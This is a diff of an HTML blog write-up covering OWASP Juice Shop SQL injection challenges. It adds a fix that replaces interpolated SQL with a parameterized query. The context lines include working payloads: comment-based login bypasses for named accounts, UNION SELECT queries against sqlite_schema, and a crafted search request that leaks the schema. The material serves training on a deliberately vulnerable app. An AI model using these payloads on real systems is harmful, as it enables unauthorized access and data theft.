@@ -53,7 +53,7 @@
         </span>
         <span id="reading-time">
           <i class="fa fa-clock-o" aria-hidden="true"></i> 
-          13 mins
+          14 mins
         </span>
         <span class="tags">
           <a href="/tag/nkcyber.html" class="tag">nkcyber</a> <a href="/tag/cybersecurity.html" class="tag">cybersecurity</a>
@@ -245,16 +245,40 @@ View full code
 <figure>
 <img src="../assets/juice-shop/injection/image-20231010211205639.png" alt="successfully logged in as the admin" /><figcaption aria-hidden="true">successfully logged in as the admin</figcaption>
 </figure>
+<p>To resolve this vulnerability, the user must not be able to directly manipulate the query sent to the database.</p>
+<p>In general, the way to address this is to escape all user inputs, so that they can only be processed as data, and never as commands.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode ts"><code class="sourceCode typescript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">// change this:</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>models<span class="op">.</span><span class="at">sequelize</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">query</span>(</span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>        <span class="vs">`SELECT * FROM Users WHERE email = &#39;</span><span class="sc">${</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>          req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">email</span> <span class="op">||</span> <span class="st">&quot;&quot;</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>        <span class="sc">}</span><span class="vs">&#39; AND password = &#39;</span><span class="sc">${</span>security<span class="op">.</span><span class="fu">hash</span>(</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>          req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">password</span> <span class="op">||</span> <span class="st">&quot;&quot;</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>        )<span class="sc">}</span><span class="vs">&#39; AND deletedAt IS NULL`</span><span class="op">,</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>        { model<span class="op">:</span> UserModel<span class="op">,</span> plain<span class="op">:</span> true }</span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>      )</span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="co">// to something like this:</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>models<span class="op">.</span><span class="at">sequelize</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">query</span>(</span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;SELECT * FROM Users WHERE email = :email AND password = :hash AND deletedAt IS NULL&quot;</span><span class="op">,</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>        {</span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>          replacements<span class="op">:</span> { <span class="co">// automatically escape user input</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>            email<span class="op">:</span> req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">email</span> <span class="op">||</span> <span class="st">&quot;&quot;</span><span class="op">,</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>            hash<span class="op">:</span> security<span class="op">.</span><span class="fu">hash</span>(req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">password</span> <span class="op">||</span> <span class="st">&quot;&quot;</span>)</span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>          }<span class="op">,</span></span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>          model<span class="op">:</span> UserModel<span class="op">,</span> plain<span class="op">:</span> true</span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>      )</span></code></pre></div>
 <h2 id="login-bender">Login Bender</h2>
 <blockquote>
 <p>Log in with Bender’s user account. (Difficulty Level: 3)</p>
 </blockquote>
 <p>Login Admin worked because the admin was the first user in the database. Now we have to adjust our strategy to work with the user Bender (email: <code>bender@juice-sh.op</code>)</p>
 <p>Let’s look at the query we used last time.</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;&#39;</span> <span class="kw">OR</span> <span class="dv">1</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
+<div class="sourceCode" id="cb6"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;&#39;</span> <span class="kw">OR</span> <span class="dv">1</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
 <p>Is there anything here that we can change to make sure it finds the user with the email <code>bender@juice-sh.op</code>.</p>
 <p>Let’s try something like:</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;bender@juice-sh.op&#39;</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;bender@juice-sh.op&#39;</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
 <p>meaning we need to input <code>bender@juice-sh.op' --</code> into the login box.</p>
 <p>Then, we get the flag! Success!</p>
 <h2 id="login-jim">Login Jim</h2>
@@ -262,7 +286,7 @@ View full code
 <p>Log in with Jim’s user account. (Difficulty Level: 3)</p>
 </blockquote>
 <p>Let’s try the same thing with the email <code>jim@juice-sh.op</code> instead:</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;jim@juice-sh.op&#39;</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
+<div class="sourceCode" id="cb8"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Users <span class="kw">WHERE</span> email <span class="op">=</span> <span class="st">&#39;jim@juice-sh.op&#39;</span> <span class="co">-- AND password = &#39;THE PASSWORD HASH&#39; AND deletedAt IS NULL</span></span></code></pre></div>
 <p>Where we need to enter: <code>jim@juice-sh.op' --</code> in the login box. The password doesn’t matter.</p>
 <p>Yup, it’s that easy.</p>
 <h2 id="admin-section">Admin Section</h2>
@@ -286,37 +310,37 @@ View full code
 <summary>
 View full code
 </summary>
-<div class="sourceCode" id="cb8"><pre class="sourceCode ts"><code class="sourceCode typescript"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>module<span class="op">.</span><span class="at">exports</span> <span class="op">=</span> <span class="kw">function</span> <span class="fu">searchProducts</span>() {</span>
-<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>  <span class="fu">return</span> (req<span class="op">:</span> Request<span class="op">,</span> res<span class="op">:</span> Response<span class="op">,</span> next<span class="op">:</span> NextFunction) <span class="kw">=&gt;</span> {</span>
-<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>    let criteria<span class="op">:</span> <span class="dt">any</span> <span class="op">=</span> req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">q</span> <span class="op">===</span> <span class="st">&quot;undefined&quot;</span> <span class="op">?</span> <span class="st">&quot;&quot;</span> <span class="op">:</span> req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">q</span> <span class="op">??</span> <span class="st">&quot;&quot;</span><span class="op">;</span></span>
-<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>    criteria <span class="op">=</span> criteria<span class="op">.</span><span class="at">length</span> <span class="op">&lt;=</span> <span class="dv">200</span> <span class="op">?</span> criteria <span class="op">:</span> criteria<span class="op">.</span><span class="fu">substring</span>(<span class="dv">0</span><span class="op">,</span> <span class="dv">200</span>)<span class="op">;</span></span>
-<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>    models<span class="op">.</span><span class="at">sequelize</span></span>
-<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">query</span>(</span>
-<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>        <span class="co">// </span><span class="al">TODO</span><span class="co">: is there any problem with using string interpolation with SQL statements?</span></span>
-<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>        <span class="vs">`SELECT * FROM Products WHERE ((name LIKE &#39;%</span><span class="sc">${</span>criteria<span class="sc">}</span><span class="vs">%&#39; OR description LIKE &#39;%</span><span class="sc">${</span>criteria<span class="sc">}</span><span class="vs">%&#39;) AND deletedAt IS NULL) ORDER BY name`</span></span>
-<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>      )</span>
-<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">then</span>(([products]<span class="op">:</span> <span class="dt">any</span>) <span class="kw">=&gt;</span> {</span>
-<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>        const dataString <span class="op">=</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(products)<span class="op">;</span></span>
-<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>        <span class="fu">for</span> (let i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> products<span class="op">.</span><span class="at">length</span><span class="op">;</span> i<span class="op">++</span>) {</span>
-<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a>          products[i]<span class="op">.</span><span class="at">name</span> <span class="op">=</span> req<span class="op">.</span><span class="fu">__</span>(products[i]<span class="op">.</span><span class="at">name</span>)<span class="op">;</span></span>
-<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>          products[i]<span class="op">.</span><span class="at">description</span> <span class="op">=</span> req<span class="op">.</span><span class="fu">__</span>(products[i]<span class="op">.</span><span class="at">description</span>)<span class="op">;</span></span>
-<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a>        }</span>
-<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a>        res<span class="op">.</span><span class="fu">json</span>(utils<span class="op">.</span><span class="fu">queryResultToJson</span>(products))<span class="op">;</span></span>
-<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a>      })</span>
-<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">catch</span>((error<span class="op">:</span> ErrorWithParent) <span class="kw">=&gt;</span> {</span>
-<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a>        <span class="fu">next</span>(error<span class="op">.</span><span class="at">parent</span>)<span class="op">;</span></span>
-<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a>      })<span class="op">;</span></span>
-<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a>  }<span class="op">;</span></span>
-<span id="cb8-22"><a href="#cb8-22" aria-hidden="true" tabindex="-1"></a>}<span class="op">;</span></span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre class="sourceCode ts"><code class="sourceCode typescript"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>module<span class="op">.</span><span class="at">exports</span> <span class="op">=</span> <span class="kw">function</span> <span class="fu">searchProducts</span>() {</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>  <span class="fu">return</span> (req<span class="op">:</span> Request<span class="op">,</span> res<span class="op">:</span> Response<span class="op">,</span> next<span class="op">:</span> NextFunction) <span class="kw">=&gt;</span> {</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>    let criteria<span class="op">:</span> <span class="dt">any</span> <span class="op">=</span> req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">q</span> <span class="op">===</span> <span class="st">&quot;undefined&quot;</span> <span class="op">?</span> <span class="st">&quot;&quot;</span> <span class="op">:</span> req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">q</span> <span class="op">??</span> <span class="st">&quot;&quot;</span><span class="op">;</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>    criteria <span class="op">=</span> criteria<span class="op">.</span><span class="at">length</span> <span class="op">&lt;=</span> <span class="dv">200</span> <span class="op">?</span> criteria <span class="op">:</span> criteria<span class="op">.</span><span class="fu">substring</span>(<span class="dv">0</span><span class="op">,</span> <span class="dv">200</span>)<span class="op">;</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>    models<span class="op">.</span><span class="at">sequelize</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">query</span>(</span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>        <span class="co">// </span><span class="al">TODO</span><span class="co">: is there any problem with using string interpolation with SQL statements?</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>        <span class="vs">`SELECT * FROM Products WHERE ((name LIKE &#39;%</span><span class="sc">${</span>criteria<span class="sc">}</span><span class="vs">%&#39; OR description LIKE &#39;%</span><span class="sc">${</span>criteria<span class="sc">}</span><span class="vs">%&#39;) AND deletedAt IS NULL) ORDER BY name`</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>      )</span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">then</span>(([products]<span class="op">:</span> <span class="dt">any</span>) <span class="kw">=&gt;</span> {</span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>        const dataString <span class="op">=</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(products)<span class="op">;</span></span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a>        <span class="fu">for</span> (let i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> products<span class="op">.</span><span class="at">length</span><span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a>          products[i]<span class="op">.</span><span class="at">name</span> <span class="op">=</span> req<span class="op">.</span><span class="fu">__</span>(products[i]<span class="op">.</span><span class="at">name</span>)<span class="op">;</span></span>
+<span id="cb9-14"><a href="#cb9-14" aria-hidden="true" tabindex="-1"></a>          products[i]<span class="op">.</span><span class="at">description</span> <span class="op">=</span> req<span class="op">.</span><span class="fu">__</span>(products[i]<span class="op">.</span><span class="at">description</span>)<span class="op">;</span></span>
+<span id="cb9-15"><a href="#cb9-15" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb9-16"><a href="#cb9-16" aria-hidden="true" tabindex="-1"></a>        res<span class="op">.</span><span class="fu">json</span>(utils<span class="op">.</span><span class="fu">queryResultToJson</span>(products))<span class="op">;</span></span>
+<span id="cb9-17"><a href="#cb9-17" aria-hidden="true" tabindex="-1"></a>      })</span>
+<span id="cb9-18"><a href="#cb9-18" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">catch</span>((error<span class="op">:</span> ErrorWithParent) <span class="kw">=&gt;</span> {</span>
+<span id="cb9-19"><a href="#cb9-19" aria-hidden="true" tabindex="-1"></a>        <span class="fu">next</span>(error<span class="op">.</span><span class="at">parent</span>)<span class="op">;</span></span>
+<span id="cb9-20"><a href="#cb9-20" aria-hidden="true" tabindex="-1"></a>      })<span class="op">;</span></span>
+<span id="cb9-21"><a href="#cb9-21" aria-hidden="true" tabindex="-1"></a>  }<span class="op">;</span></span>
+<span id="cb9-22"><a href="#cb9-22" aria-hidden="true" tabindex="-1"></a>}<span class="op">;</span></span></code></pre></div>
 </details>
 <p>I’m specifically looking at the line that uses string interpolation for a SQL query:</p>
-<div class="sourceCode" id="cb9"><pre class="sourceCode ts"><code class="sourceCode typescript"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>models<span class="op">.</span><span class="at">sequelize</span></span>
-<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">query</span>(</span>
-<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>        <span class="co">// </span><span class="al">TODO</span><span class="co">: is there any problem with using string interpolation with SQL statements?</span></span>
-<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>        <span class="vs">`SELECT * FROM Products WHERE ((name LIKE &#39;%</span><span class="sc">${</span>criteria<span class="sc">}</span><span class="vs">%&#39; OR description LIKE &#39;%</span><span class="sc">${</span>criteria<span class="sc">}</span><span class="vs">%&#39;) AND deletedAt IS NULL) ORDER BY name`</span></span>
-<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>      )</span></code></pre></div>
+<div class="sourceCode" id="cb10"><pre class="sourceCode ts"><code class="sourceCode typescript"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>models<span class="op">.</span><span class="at">sequelize</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">query</span>(</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>        <span class="co">// </span><span class="al">TODO</span><span class="co">: is there any problem with using string interpolation with SQL statements?</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>        <span class="vs">`SELECT * FROM Products WHERE ((name LIKE &#39;%</span><span class="sc">${</span>criteria<span class="sc">}</span><span class="vs">%&#39; OR description LIKE &#39;%</span><span class="sc">${</span>criteria<span class="sc">}</span><span class="vs">%&#39;) AND deletedAt IS NULL) ORDER BY name`</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>      )</span></code></pre></div>
 <p>Or rather:</p>
-<div class="sourceCode" id="cb10"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%${criteria}%&#39;</span> <span class="kw">OR</span> description <span class="kw">LIKE</span> <span class="st">&#39;%${criteria}%&#39;</span>) <span class="kw">AND</span> deletedAt <span class="kw">IS</span> <span class="kw">NULL</span>) <span class="kw">ORDER</span> <span class="kw">BY</span> name</span></code></pre></div>
+<div class="sourceCode" id="cb11"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%${criteria}%&#39;</span> <span class="kw">OR</span> description <span class="kw">LIKE</span> <span class="st">&#39;%${criteria}%&#39;</span>) <span class="kw">AND</span> deletedAt <span class="kw">IS</span> <span class="kw">NULL</span>) <span class="kw">ORDER</span> <span class="kw">BY</span> name</span></code></pre></div>
 <p>So, we need to enter something that is going to give us the database schema from this query.</p>
 <p>Given the special situation of being two parenthesis deep, we know we’re going to have to add <code>'))</code> to the start of our query.</p>
 <p>Then, we’re going to need to append more data to the end of the query, so that we get back the data we’re looking for.</p>
@@ -334,11 +358,11 @@ View full code
 <p>So, it’s going to be something like <code>')) UNION SELECT something FROM sqlite_schema</code>.</p>
 <p>We know <code>sql</code> will be the name of the column with the schema. But, in order to get the rest of the column names, we can just guess with their positions.</p>
 <p>So, we can try:</p>
-<div class="sourceCode" id="cb11"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> sql <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 1</span></span>
-<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> sql,<span class="dv">2</span> <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 2</span></span>
-<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> sql,<span class="dv">2</span>,<span class="dv">3</span> <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 3</span></span>
-<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> sql,<span class="dv">2</span>,<span class="dv">3</span>,<span class="dv">4</span> <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 4</span></span>
-<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="co">-- et cetera...</span></span></code></pre></div>
+<div class="sourceCode" id="cb12"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> sql <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 1</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> sql,<span class="dv">2</span> <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 2</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> sql,<span class="dv">2</span>,<span class="dv">3</span> <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 3</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> sql,<span class="dv">2</span>,<span class="dv">3</span>,<span class="dv">4</span> <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 4</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="co">-- et cetera...</span></span></code></pre></div>
 <p>So, let’s put it into action.</p>
 <h3 id="execution">Execution</h3>
 <p>So, first, let’s open up Burp Suite to see the requests we’re sending to the server.</p>
@@ -353,7 +377,7 @@ View full code
 <img src="../assets/juice-shop/injection/image-20231010225613568.png" alt="By default, it returns all of the items" /><figcaption aria-hidden="true">By default, it returns all of the items</figcaption>
 </figure>
 <p>Let’s try and inject our first query:</p>
-<div class="sourceCode" id="cb12"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> <span class="dv">1</span> <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 1</span></span></code></pre></div>
+<div class="sourceCode" id="cb13"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> <span class="dv">1</span> <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 1</span></span></code></pre></div>
 <p>To inject it, we’re going to need to to change the request to query with <code>')) UNION SELECT 1 FROM sqlite_schema --</code>. Also, remember that url parameters are separated by <code>+</code>, giving us:</p>
 <pre class="http"><code>GET /rest/products/search?q=&#39;))+UNION+SELECT+1+FROM+sqlite_schema+--</code></pre>
 <figure>
@@ -370,17 +394,17 @@ View full code
 <img src="../assets/juice-shop/injection/image-20231010230936749.png" alt="The data is leaked" /><figcaption aria-hidden="true">The data is leaked</figcaption>
 </figure>
 <p>And there we go!</p>
-<div class="sourceCode" id="cb15"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
-<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;id&quot;</span><span class="fu">:</span> <span class="dv">1</span><span class="fu">,</span></span>
-<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;name&quot;</span><span class="fu">:</span> <span class="dv">2</span><span class="fu">,</span></span>
-<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;description&quot;</span><span class="fu">:</span> <span class="dv">3</span><span class="fu">,</span></span>
-<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;price&quot;</span><span class="fu">:</span> <span class="dv">4</span><span class="fu">,</span></span>
-<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;deluxePrice&quot;</span><span class="fu">:</span> <span class="dv">5</span><span class="fu">,</span></span>
-<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;image&quot;</span><span class="fu">:</span> <span class="dv">6</span><span class="fu">,</span></span>
-<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;createdAt&quot;</span><span class="fu">:</span> <span class="dv">7</span><span class="fu">,</span></span>
-<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;updatedAt&quot;</span><span class="fu">:</span> <span class="dv">8</span><span class="fu">,</span></span>
-<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;deletedAt&quot;</span><span class="fu">:</span> <span class="dv">9</span></span>
-<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb16"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
